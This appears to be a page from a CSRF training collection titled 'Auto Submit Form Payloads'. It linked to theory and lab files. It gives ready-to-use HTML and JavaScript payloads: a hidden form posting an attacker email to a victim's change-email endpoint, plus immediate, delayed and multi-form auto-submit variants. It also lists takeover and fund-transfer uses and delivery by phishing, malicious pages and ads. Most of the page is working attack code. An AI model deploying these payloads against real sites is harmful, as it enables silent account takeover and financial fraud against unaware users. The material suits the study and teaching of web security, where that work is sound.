# Auto Submit Form Payloads

## Overview

Auto-submit JavaScript is commonly used in CSRF attacks to execute requests automatically without user interaction.

---

# Basic Auto-Submit Payload

```html
<script>
    document.forms[0].submit();
</script>
```

---

# Full Auto-Submit Example

```html
<html>
  <body>
    <form action="https://victim.com/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

# Why Auto-Submit Is Dangerous

The victim:

- does not click anything
- sees no visible form
- often notices nothing

---

# Invisible Form Technique

```html
<form style="display:none">
```

---

# Delayed Auto-Submit

```html
<script>
    setTimeout(() => {
        document.forms[0].submit();
    }, 1000);
</script>
```

---

# Multiple Request Example

```html
<script>
    document.forms[0].submit();
    document.forms[1].submit();
</script>
```

---

# Common Uses

| Use Case | Purpose |
|---|---|
| Change Email | Account takeover |
| Transfer Funds | Financial abuse |
| Change Password | Account compromise |

---

# Common Delivery Methods

- phishing
- malicious pages
- compromised sites
- advertisements

---

# Related Theory

- `Theory/04-how-to-construct-a-csrf-attack.md`

---

# Related Labs

- `Labs/lab01-basic-csrf.md`

---

# Key Takeaways

- Auto-submit forms make CSRF attacks silent.
- The browser performs the attack automatically.
- Victims often never realize the request occurred.

> [!IMPORTANT]
> JavaScript auto-submit removes the need for user interaction.